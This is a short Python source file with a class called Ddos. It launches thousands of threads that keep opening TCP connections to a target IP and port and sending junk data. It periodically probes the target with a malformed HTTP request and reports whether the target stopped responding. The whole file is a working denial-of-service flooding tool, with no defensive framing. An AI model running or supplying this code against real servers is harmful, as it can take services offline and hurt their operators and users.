import socket
from threading import Thread
import time


class Ddos(Thread):
    def __init__(self, ip, port, errorMax=100):
        Thread.__init__(self)
        self.errorMax = errorMax
        self.errorsCount = 0
        self.ip = ip
        self.port = int(port)

    def run(self):
        self.stop_threads = True
        i = 0
        self.mycount = 0
        while (i < 5000) and (self.mycount < self.errorMax):
            self.mycount = 0
            thread = Thread(target=self.attack, args=(self.ip, self.port))
            thread.start()
            if (i % 100 == 0):
                #time.sleep(5)
                error = True
                print("threads", i)
                while error and self.mycount < self.errorMax:
                    try:
                        message = "GET / HTTP/1.1 \r\n".encode("utf-8")
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        '''s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((self.ip, self.port))
                        s.send("GET / HTTP/1.1 \r\n".encode("utf-8"))'''
                        sock.connect((self.ip, self.port))
                        sock.send(message)
                        sock.sendto(message, (self.ip, self.port))


                        error = False
                    except socket.error as e2:
                        self.mycount += 1
                        print("error", self.mycount)

            i = i + 1
        self.stop_threads=False
        self.data = dict()
        self.data['threads'] = i
        if (self.mycount < self.errorMax):
            self.data['result'] = "False"
        else:
            self.data['result'] = "True"

    def join(self):
        Thread.join(self)

        return self.data

    def attack(self, ip, port):


        '''while self.stop_threads:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send("GET / HTTP/1.1 \r\n".encode("utf-8"))'''
        message = "+he".encode("utf-8")
        while self.stop_threads:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                sock.send(message)
                #sock.sendto(message, (ip, port))
                #for x in range(100):
                #    s.send(data)
            except:
                sock.close()

